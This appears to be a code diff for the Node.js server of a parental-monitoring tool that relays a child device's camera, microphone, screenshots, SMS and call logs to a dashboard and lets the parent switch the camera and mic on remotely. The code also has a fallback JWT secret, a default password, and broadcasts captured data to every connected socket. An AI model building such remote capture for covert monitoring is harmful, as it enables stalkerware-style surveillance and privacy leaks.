@@ -17,12 +17,24 @@ app.use(express.json());
 const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret-in-production';
 const parentAccounts = [{ email: 'parent@example.com', password: 'changeme123' }];
 const connectedDevices = {}; // deviceId -> { socketId, info, battery }
+const deviceNames = {};      // deviceId -> custom display name
 
 // ── Screenshot folder helper ──────────────────────────────────────
 function getScreenshotFolder(deviceId) {
   const folder = path.join(os.homedir(), 'Desktop', 'MDM-Screenshots', deviceId);
   fs.mkdirSync(folder, { recursive: true });
   return folder;
+}
+
+function authenticate(req, res, next) {
+  const auth = req.headers.authorization;
+  if (!auth) return res.status(401).json({ error: 'No token' });
+  try {
+    req.user = jwt.verify(auth.split(' ')[1], JWT_SECRET);
+    next();
+  } catch {
+    res.status(401).json({ error: 'Invalid token' });
+  }
 }
 
 // ── REST API ──────────────────────────────────────────────────────
@@ -37,6 +49,7 @@ app.post('/api/login', (req, res) => {
 app.get('/api/devices', authenticate, (req, res) => {
   const list = Object.keys(connectedDevices).map(id => ({
     deviceId: id,
+    name: deviceNames[id] || null,
     online: !!connectedDevices[id]?.socketId,
     info: connectedDevices[id]?.info || null,
     battery: connectedDevices[id]?.battery || null,
@@ -44,16 +57,14 @@ app.get('/api/devices', authenticate, (req, res) => {
   res.json(list);
 });
 
-function authenticate(req, res, next) {
-  const auth = req.headers.authorization;
-  if (!auth) return res.status(401).json({ error: 'No token' });
-  try {
-    req.user = jwt.verify(auth.split(' ')[1], JWT_SECRET);
-    next();
-  } catch {
-    res.status(401).json({ error: 'Invalid token' });
-  }
-}
+app.put('/api/devices/:deviceId/name', authenticate, (req, res) => {
+  const { deviceId } = req.params;
+  const { name } = req.body;
+  if (!name || typeof name !== 'string') return res.status(400).json({ error: 'Name required' });
+  deviceNames[deviceId] = name.trim().slice(0, 50);
+  io.emit('device:name', { deviceId, name: deviceNames[deviceId] });
+  res.json({ ok: true, name: deviceNames[deviceId] });
+});
 
 // ── Socket.io ─────────────────────────────────────────────────────
 io.on('connection', socket => {
@@ -72,12 +83,8 @@ io.on('connection', socket => {
       console.log(`Child disconnected: ${deviceId}`);
     });
 
-    // Camera frame → relay to parents
-    socket.on('camera:frame', data => {
-      io.emit('camera:frame', { deviceId, ...data });
-    });
+    socket.on('camera:frame', data => io.emit('camera:frame', { deviceId, ...data }));
 
-    // Screenshot data → save to Desktop + notify parents
     socket.on('screenshot:data', ({ frame }) => {
       try {
         const folder = getScreenshotFolder(deviceId);
@@ -92,31 +99,21 @@ io.on('connection', socket => {
       }
     });
 
-    // Mic events → relay to parents
     socket.on('mic:audio', data => io.emit('mic:audio', { deviceId, ...data }));
     socket.on('mic:state', data => io.emit('mic:state', { deviceId, ...data }));
 
-    // Device info → store + relay
     socket.on('device:info', data => {
       if (connectedDevices[deviceId]) connectedDevices[deviceId].info = data;
       io.emit('device:info', { deviceId, ...data });
     });
 
-    // Battery → store + relay
     socket.on('battery:update', data => {
       if (connectedDevices[deviceId]) connectedDevices[deviceId].battery = data;
       io.emit('battery:update', { deviceId, ...data });
     });
 
-    // Call logs → relay to parents
-    socket.on('call:logs', data => {
-      io.emit('call:logs', { deviceId, ...data });
-    });
-
-    // SMS → relay to parents
-    socket.on('sms:messages', data => {
-      io.emit('sms:messages', { deviceId, ...data });
-    });
+    socket.on('call:logs',    data => io.emit('call:logs',    { deviceId, ...data }));
+    socket.on('sms:messages', data => io.emit('sms:messages', { deviceId, ...data }));
   }
 
   // ── Parent dashboard ─────────────────────────────────────────
@@ -127,14 +124,29 @@ io.on('connection', socket => {
       return connectedDevices[devId]?.socketId || null;
     }
 
-    socket.on('cmd:camera:start',  ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:camera:start'); });
-    socket.on('cmd:camera:stop',   ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:camera:stop'); });
-    socket.on('cmd:mic:on',        ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:mic:on'); });
-    socket.on('cmd:mic:off',       ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:mic:off'); });
-    socket.on('cmd:speak',         ({ deviceId, audioData }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:speak', { audioData }); });
-    socket.on('cmd:screenshot',    ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:screenshot'); });
-    socket.on('cmd:get:calllogs',  ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:get:calllogs'); });
-    socket.on('cmd:get:sms',       ({ deviceId }) => { const s = toChild(deviceId); if (s) io.to(s).emit('cmd:get:sms'); });
+    function relay(cmd) {
+      socket.on(cmd, ({ deviceId: devId, ...rest }) => {
+        const s = toChild(devId);
+        if (s) io.to(s).emit(cmd, Object.keys(rest).length ? rest : undefined);
+      });
+    }
+
+    relay('cmd:camera:start');
+    relay('cmd:camera:stop');
+    relay('cmd:camera:start:front');
+    relay('cmd:camera:start:back');
+    relay('cmd:camera:stop:front');
+    relay('cmd:camera:stop:back');
+    relay('cmd:mic:on');
+    relay('cmd:mic:off');
+    relay('cmd:screenshot');
+    relay('cmd:get:calllogs');
+    relay('cmd:get:sms');
+
+    socket.on('cmd:speak', ({ deviceId: devId, audioData }) => {
+      const s = toChild(devId);
+      if (s) io.to(s).emit('cmd:speak', { audioData });
+    });
   }
 });
 
